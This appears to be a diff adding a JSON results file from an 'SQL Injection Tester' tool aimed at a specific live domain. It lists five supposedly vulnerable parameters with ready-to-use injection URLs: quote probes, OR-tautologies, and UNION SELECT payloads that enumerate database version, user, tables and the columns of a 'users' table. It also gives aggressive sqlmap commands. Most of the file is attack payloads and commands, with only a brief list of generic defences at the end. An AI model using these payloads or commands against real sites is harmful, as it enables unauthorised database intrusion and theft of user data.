@@ -1,0 +1,89 @@
+{
+  "tool": "SQL Injection Tester",
+  "status": "critical",
+  "timestamp": "2025-12-14 22:58:27",
+  "output": "SQL Injection Test Results for https://obinance.com/:\n\n🚨 \u001b[31mPOTENTIAL SQL INJECTION VULNERABILITIES:\u001b[0m\n\nAffected parameters: id, page, user, product, category\n\n🔧 \u001b[33mExploits for parameter 'id':\u001b[0m\n  Basic Exploitation URLs:\n    • https://obinance.com/?id='\n    • https://obinance.com/?id=\"\n    • https://obinance.com/?id=1 OR 1\n  \n  Automated Tools:\n    • sqlmap: sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3\n    • sqlmap (with proxy): sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch\n\n🔧 \u001b[33mExploits for parameter 'page':\u001b[0m\n  Basic Exploitation URLs:\n    • https://obinance.com/?page='\n    • https://obinance.com/?page=\"\n    • https://obinance.com/?page=1' OR '1'\n  \n  Automated Tools:\n    • sqlmap: sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3\n    • sqlmap (with proxy): sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch\n\n🔧 \u001b[33mExploits for parameter 'user':\u001b[0m\n  Basic Exploitation URLs:\n    • https://obinance.com/?user='\n    • https://obinance.com/?user=\"\n    • https://obinance.com/?user=1' OR '1'\n  \n  Automated Tools:\n    • sqlmap: sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3\n    • sqlmap (with proxy): sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch\n\n🔧 \u001b[33mExploits for parameter 'product':\u001b[0m\n  Basic Exploitation URLs:\n    • https://obinance.com/?product='\n    • https://obinance.com/?product=1' OR '1'\n    • https://obinance.com/?product=1 OR 1\n  \n  Automated Tools:\n    • sqlmap: sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3\n    • sqlmap (with proxy): sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch\n\n🔧 \u001b[33mExploits for parameter 'category':\u001b[0m\n  Basic Exploitation URLs:\n    • https://obinance.com/?category='\n    • https://obinance.com/?category=\"\n    • https://obinance.com/?category=1' OR '1'\n  \n  Automated Tools:\n    • sqlmap: sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3\n    • sqlmap (with proxy): sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch\n\n\n⚠ \u001b[33mSECURITY RECOMMENDATIONS:\u001b[0m\n1. Use parameterized queries\n2. Implement input validation\n3. Use stored procedures\n4. Apply principle of least privilege\n5. Use Web Application Firewall\n",
+  "details": {
+    "vulnerable_params": [
+      "id",
+      "page",
+      "user",
+      "product",
+      "category"
+    ],
+    "tested_params": [
+      "id",
+      "page",
+      "user",
+      "product",
+      "category"
+    ],
+    "exploits": {
+      "basic": [
+        {
+          "description": "Basic SQL Injection - '",
+          "url": "https://obinance.com/?category='",
+          "risk": "High"
+        },
+        {
+          "description": "Basic SQL Injection - \"",
+          "url": "https://obinance.com/?category=\"",
+          "risk": "High"
+        },
+        {
+          "description": "Basic SQL Injection - 1' OR '1'",
+          "url": "https://obinance.com/?category=1' OR '1'",
+          "risk": "High"
+        },
+        {
+          "description": "Basic SQL Injection - 1 OR 1",
+          "url": "https://obinance.com/?category=1 OR 1",
+          "risk": "High"
+        }
+      ],
+      "advanced": [
+        {
+          "description": "Advanced SQLi - ' UNION SELECT null,version()--",
+          "url": "https://obinance.com/?category=' UNION SELECT null,version()--",
+          "risk": "Critical"
+        },
+        {
+          "description": "Advanced SQLi - ' UNION SELECT null,user()--",
+          "url": "https://obinance.com/?category=' UNION SELECT null,user()--",
+          "risk": "Critical"
+        },
+        {
+          "description": "Advanced SQLi - ' UNION SELECT null,database()--",
+          "url": "https://obinance.com/?category=' UNION SELECT null,database()--",
+          "risk": "Critical"
+        },
+        {
+          "description": "Advanced SQLi - ' UNION SELECT null,table_name FROM information_schema.tables--",
+          "url": "https://obinance.com/?category=' UNION SELECT null,table_name FROM information_schema.tables--",
+          "risk": "Critical"
+        },
+        {
+          "description": "Advanced SQLi - ' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--",
+          "url": "https://obinance.com/?category=' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--",
+          "risk": "Critical"
+        }
+      ],
+      "commands": [
+        {
+          "tool": "sqlmap",
+          "command": "sqlmap -u \"https://obinance.com/\" --batch --level=3 --risk=3"
+        },
+        {
+          "tool": "sqlmap (with proxy)",
+          "command": "sqlmap -u \"https://obinance.com/\" --proxy=\"http://127.0.0.1:8080\" --batch"
+        }
+      ],
+      "resources": [
+        {
+          "type": "cheatsheet",
+          "url": "https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet"
+        }
+      ]
+    }
+  }
+}
